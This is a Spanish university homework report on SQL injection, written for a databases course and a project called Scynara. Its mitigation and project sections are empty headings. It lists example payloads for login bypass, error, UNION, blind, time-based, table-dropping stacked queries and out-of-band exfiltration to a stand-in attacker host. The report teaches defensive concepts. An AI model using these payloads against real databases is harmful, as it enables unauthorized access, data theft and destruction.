<div align="center">
  <img src="https://images.seeklogo.com/logo-png/7/2/ipn-logo-png_seeklogo-73340.png" align="left" width="90" alt="Logo IPN" />
  <img src="https://www.escom.ipn.mx/x/ee2021/images/galeriaEE2021/escudo_ESCOM.png" align="right" width="120" alt="Logo ESCOM" />
  
  <h2>Instituto Politécnico Nacional</h2>
  <h2>Escuela Superior de Cómputo</h2>

  <br><br><br><br>

  <b>Tarea</b><br>
  <b>Seguridad y Vulnerabilidades en Bases de Datos: SQL Injection</b>

  <br><br><br>

  <b>Alumno:</b><br><br>
  Olate Tomás Kevin Saúl<br>
  Garcia Peñalva Saúl 
  

  <br><br>

  <b>Profesor:</b><br>
  Gabriel Hurtado Avilés

  <br><br>

  <b>Unidad de Aprendizaje:</b><br>
  Bases de Datos

  <br><br>

  <b>Grupo:</b><br>
  3BV1

  <br><br>
</div>

---

# Tarea de SQL Injection

La presente tarea tiene como objetivo explorar los conceptos fundamentales de la inyección SQL (SQL Injection) y analizar su implementación en el proyecto Scynara. Para ello, se proporciona el backend de la aplicación, configurado para su despliegue en contenedores Docker, y se documenta el procedimiento de ejecución y validación mediante el uso de herramientas de prueba de APIs, como Postman y Thunder Client.

## Introducción 
En los años 90, cuando las páginas web comenzaron a ser interactivas y a conectarse directamente con las bases de datos, surgieron nuevos riesgos de seguridad. En ese contexto apareció la Inyección SQL, registrada por primera vez en 1998.

A pesar de todo lo que ha avanzado la tecnología y la programación desde entonces, esta amenaza no ha desaparecido. Hoy en día, prevenirla sigue siendo un requisito obligatorio y fundamental al desarrollar cualquier sistema que maneje información.

## ¿Qué es SQL Injection?
La Inyección SQL es un ataque que consiste en insertar código SQL malicioso directamente en los campos de entrada de datos de una aplicación, tales como formularios de inicio de sesión, barras de búsqueda o parámetros de la URL.  
Esta vulnerabilidad ocurre principalmente cuando un sistema no filtra, sanitiza ni valida adecuadamente la información ingresada por el usuario. Como resultado, cuando la aplicación procesa esta entrada, el motor de la base de datos recibe el código manipulado y lo ejecuta bajo la premisa de que es una instrucción legítima del sistema.  
En la práctica, este ataque se aprovecha de la mala costumbre de concatenar texto directamente en las consultas del backend. Al explotar esta falla, un atacante puede alterar la lógica original de la base de datos para evadir autenticaciones, extraer información confidencial o ejecutar comandos destructivos.

## Elementos Fundamentales de la Inyección SQL
Para que un ataque de inyección SQL se materialice, el sistema debe presentar deficiencias específicas en el procesamiento de la información. 
El ataque inicia cuando un actor malicioso inserta código manipulado en los campos de entrada de la aplicación, como los formularios de inicio de sesión o los parámetros de búsqueda. La vulnerabilidad crítica ocurre cuando el backend carece de una separación estricta entre la estructura de la consulta y los datos del usuario, tomando esta entrada y concatenándola directamente como texto plano sin un filtrado previo. En consecuencia, el motor de la base de datos recibe la cadena completa y ejecuta el código malicioso bajo la falsa premisa de que es una instrucción legítima del sistema.

Para que este engaño funcione en motores relacionales, los atacantes inyectan caracteres de control y palabras clave (como comillas simples ', signos de igual =, o guiones de comentario -- en el caso de MySQL) para alterar la estructura de la consulta original. El ejemplo más didáctico es la evasión de un login. Si el sistema espera credenciales, un atacante puede ingresar un texto manipulado como admin' -- en el campo de usuario. La comilla simple (') le indica a la base de datos que el texto del nombre ha terminado prematuramente, mientras que los guiones (--) le ordenan interpretar el resto de la consulta como un comentario, eliminando por completo la validación de la contraseña. Otra técnica fundamental es ingresar 1' OR '1'='1, lo cual fuerza a que la condición matemática sea siempre verdadera, otorgando acceso inmediato.

Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evoluciona en diferentes variantes dependiendo de cómo el sistema devuelva la información. A continuación, se clasifican las formas más comunes:

| **Categoría Principal** | **Técnica Específica** | **Descripción del Mecanismo** | **Ejemplo de Payload** | **Escenario de Explotación en el Backend** |
|---|---|---|---|---|
| **In-Band (Misma Banda)** | **Basada en Errores (Error-Based)** | El atacante introduce instrucciones SQL malformadas con el propósito de provocar errores controlados en el motor de base de datos. Los mensajes de error generados pueden revelar información sensible, como nombres de tablas, columnas, rutas del sistema, versiones del SGBD o detalles de la configuración interna. | `' OR 1=CONVERT(int,(SELECT @@version)) --` | Durante la ejecución de un CRUD de productos, una excepción no controlada genera un código HTTP 500 y expone el *stack trace* completo, revelando el nombre de la base de datos, el tipo de gestor utilizado y parte de la consulta ejecutada. |
| **In-Band (Misma Banda)** | **Basada en UNION (UNION-Based)** | Aprovecha el operador `UNION SELECT` para combinar el resultado de una consulta maliciosa con el de una consulta legítima. Para que el ataque sea exitoso, ambas consultas deben poseer el mismo número de columnas y tipos de datos compatibles. | `' UNION SELECT 1, version(), current_database() --` | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios limitados intercepta la petición `GET /api/categorias?id=1` e inyecta una consulta `UNION` para obtener identificadores de inquilinos (`tenant_id`) y credenciales de otros administradores almacenadas en la base de datos. |
| **Inferencial (Ciega)** | **Basada en Booleanos (Boolean-Based)** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
| **Inferencial (Ciega)** | **Basada en Tiempo (Time-Based)** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
| **Consultas Apiladas (Stacked Queries)** | **Ataques Destructivos / DDL-DML** | Consiste en finalizar la consulta original mediante un punto y coma (`;`) y concatenar instrucciones adicionales, como `DROP`, `UPDATE`, `INSERT` o `DELETE`. Su viabilidad depende de las restricciones impuestas por el controlador de conexión y la configuración del motor de base de datos. | `1'); DROP TABLE categorias_crud; --` | En determinadas configuraciones de PostgreSQL, un uso incorrecto del controlador de acceso puede permitir la ejecución de múltiples sentencias en una sola petición. En consecuencia, un atacante podría modificar o eliminar datos críticos mediante instrucciones concatenadas. |
| **Out-of-Band (OOB)** | **Exfiltración Externa** | Se emplea cuando no es posible obtener información mediante respuestas directas o técnicas inferenciales. El atacante induce al motor de base de datos a realizar comunicaciones externas, como consultas DNS o solicitudes HTTP, enviando los datos extraídos hacia un servidor bajo su control. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(SQL Server)* | Tras ejecutar el payload, el servidor de base de datos realiza una resolución DNS hacia un dominio controlado por el atacante, por ejemplo `password_robada.atacante.com`. El atacante posteriormente analiza los registros de su servidor para recuperar la información exfiltrada. |

> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales (Blind)** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band (OOB)** emplean canales externos de comunicación para la extracción de información.

## Mejores Prácticas de Mitigación

## Prevención en Backends Modernos


# Análisis e Implementación en el Proyecto Scynara

## Arquitectura y Configuración del Entorno 

## Herramientas de Validación y Pruebas